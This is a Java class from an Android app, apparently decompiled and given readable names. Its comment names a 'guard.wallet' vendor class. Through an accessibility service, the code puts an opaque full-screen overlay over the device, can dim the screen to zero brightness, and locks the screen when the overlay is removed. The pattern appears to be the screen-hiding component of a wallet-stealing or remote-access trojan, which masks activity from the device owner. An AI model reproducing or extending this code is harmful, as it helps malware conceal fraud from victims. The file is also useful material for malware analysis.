package com.guard.wallet.helper;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.permission.DelegateTaskRunner;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import android.view.WindowManager;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 遮罩视图管理器 — 管理全屏 BlockView 的显示、移除和状态查询。
 * <p>
 * vendor 原始类名: com.guard.wallet.helper.g
 */
public abstract class BlockViewManager {
    public static final AtomicReference<Object> a = new AtomicReference<>();
    public static final ReentrantLock b = new ReentrantLock();
    public static WindowManager c;
    public static final AtomicInteger d = new AtomicInteger(-1);
    public static final AtomicBoolean e = new AtomicBoolean(true);
    public static final AtomicBoolean f = new AtomicBoolean(false);

    public static boolean a(BlockViewVO var0) {
        try {
            BlockViewVO var1 = var0;
            if (var0 == null) {
                var1 = new BlockViewVO();
            }
            if (g()) {
                return g();
            }
            if (MyAccessibilityService.P() == null) {
                return g();
            }
            ReentrantLock reentrantLock = b;
            if (!reentrantLock.tryLock()) {
                return g();
            }
            try {
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    b(var1);
                } else {
                    Handler handler = new Handler(Looper.getMainLooper());
                    DelegateTaskRunner runnable = new DelegateTaskRunner(3, var1);
                    handler.post(runnable);
                }
                AtomicInteger counter = new AtomicInteger(0);
                while (!f.get() && counter.incrementAndGet() < 100) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "\u526f\u8fdb\u7a0b\u7b49\u5f85BlockView\u663e\u793a\u81f3\u7a97\u53e3");
                    com.guard.wallet.utils.SystemHelper.T0(1);
                }
            } finally {
                reentrantLock.unlock();
            }
            return g();
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
            return g();
        }
    }

    public static void b(BlockViewVO var0) {
        try {
            d.set(com.guard.wallet.utils.SystemHelper.O0());
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 591800;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.x = 0;
            layoutParams.y = 0;
            layoutParams.width = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics().getWidth();
            layoutParams.height = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics().getHeight();
            if (MyAccessibilityService.P() != null) {
                com.guard.wallet.view.FloatingBlockView blockView = new com.guard.wallet.view.FloatingBlockView(MyAccessibilityService.P(), var0.getHint(), var0.getBlockDrawable());
                if (c == null) {
                    c = (WindowManager) MyAccessibilityService.P().getSystemService("window");
                }
                layoutParams.type = 2032;
                Log.d("com.guard.wallet.helper.BlockViewManager", "BlockTextView \u521b\u5efa\u5b8c\u6210");
                if (var0.isZeroBrightness() && com.guard.wallet.utils.WindowUtils.setScreenBrightness(0)) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "BlockTextView \u4eae\u5ea6\u8bbe\u7f6e\u4e3a0");
                }
                e.set(var0.isDestroyLock());
                c.addView(blockView, layoutParams);
                ViewTreeObserver vto = blockView.getViewTreeObserver();
                WindowAttachListener listener = new WindowAttachListener();
                vto.addOnWindowAttachListener(listener);
                a.set(blockView);
                com.guard.wallet.utils.SharedPrefsManager.I();
            } else {
                Log.d("com.guard.wallet.helper.BlockViewManager", "BlockTextView \u521b\u5efa\u5931\u8d25");
            }
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
        }
    }

    public static void c() {
        try {
            Object var0 = a.get();
            if (var0 == null) {
                return;
            }
            ReentrantLock reentrantLock = b;
            if (!reentrantLock.tryLock()) {
                return;
            }
            try {
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    d();
                } else {
                    Handler handler = new Handler(Looper.getMainLooper());
                    DelayedRunnable runnable = new DelayedRunnable(1);
                    handler.post(runnable);
                }
                AtomicInteger counter = new AtomicInteger(0);
                while (f.get() && counter.incrementAndGet() < 100) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "\u7b49\u5f85BlockView\u4ece\u7a97\u53e3\u79fb\u9664");
                    com.guard.wallet.utils.SystemHelper.T0(1);
                }
            } finally {
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
        }
        g();
    }

    public static void d() {
        try {
            AtomicInteger var0 = d;
            if (var0.get() > 0) {
                if (com.guard.wallet.utils.WindowUtils.setScreenBrightness(var0.get())) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "\u4eae\u5ea6\u5df2\u6062\u590d");
                }
                var0.set(-1);
            }
            AtomicReference<Object> var2 = a;
            if (var2.get() == null) {
                return;
            }
            MyAccessibilityService var1 = MyAccessibilityService.P();
            AtomicBoolean var9 = e;
            if (var1 != null) {
                if (Build.VERSION.SDK_INT >= 28 && var9.get()) {
                    com.guard.wallet.utils.SystemHelper.F0(8);
                    com.guard.wallet.utils.SystemHelper.T0(5);
                }
            }
            if (c != null && var2.get() != null) {
                c.removeViewImmediate((View) var2.get());
                var2.set(null);
                var9.set(true);
                com.guard.wallet.utils.SharedPrefsManager.I();
            }
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
        }
    }

    public static boolean e() {
        try {
            Object var0 = a.get();
            if (var0 == null) {
                return !g();
            }
            ReentrantLock reentrantLock = b;
            if (!reentrantLock.tryLock()) {
                return !g();
            }
            try {
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    f();
                } else {
                    Handler handler = new Handler(Looper.getMainLooper());
                    DelayedRunnable runnable = new DelayedRunnable(0);
                    handler.post(runnable);
                }
                AtomicInteger counter = new AtomicInteger(0);
                while (f.get() && counter.incrementAndGet() < 100) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "\u7b49\u5f85BlockView\u4ece\u7a97\u53e3\u79fb\u9664");
                    com.guard.wallet.utils.SystemHelper.T0(1);
                }
            } finally {
                reentrantLock.unlock();
            }
            return !g();
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
            return !g();
        }
    }

    public static void f() {
        try {
            AtomicInteger var0 = d;
            if (var0.get() > 0) {
                if (com.guard.wallet.utils.WindowUtils.setScreenBrightness(var0.get())) {
                    Log.d("com.guard.wallet.helper.BlockViewManager", "\u4eae\u5ea6\u5df2\u6062\u590d");
                }
                var0.set(-1);
            }
            AtomicReference<Object> var2 = a;
            if (var2.get() == null) {
                return;
            }
            if (c != null && var2.get() != null) {
                c.removeViewImmediate((View) var2.get());
                var2.set(null);
                e.set(true);
                com.guard.wallet.utils.SharedPrefsManager.I();
            }
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.helper.BlockViewManager", e2);
        }
    }

    public static boolean g() {
        return a.get() != null && c != null;
    }

    public static void h(int var0) {
        AtomicReference<Object> var1 = a;
        if (var1.get() != null) {
            com.guard.wallet.view.FloatingBlockView blockView = (com.guard.wallet.view.FloatingBlockView) var1.get();
            if (var0 > 0) {
                WeakReference<?> var2 = blockView.statusBarViewRef;
                if (var2 != null && var2.get() != null) {
                    com.guard.wallet.view.StatusBarView innerView = (com.guard.wallet.view.StatusBarView) blockView.statusBarViewRef.get();
                    if (var0 > 0) {
                        WeakReference<?> var3 = innerView.progressBarRef;
                        if (var3 != null && var3.get() != null) {
                            com.guard.wallet.view.OverlayMaskView progressBar = (com.guard.wallet.view.OverlayMaskView) innerView.progressBarRef.get();
                            progressBar.getClass();
                            if (var0 > 0) {
                                Message msg = new Message();
                                msg.what = var0;
                                progressBar.handler.sendMessage(msg);
                            }
                        }
                    }
                }
            }
        }
    }
}
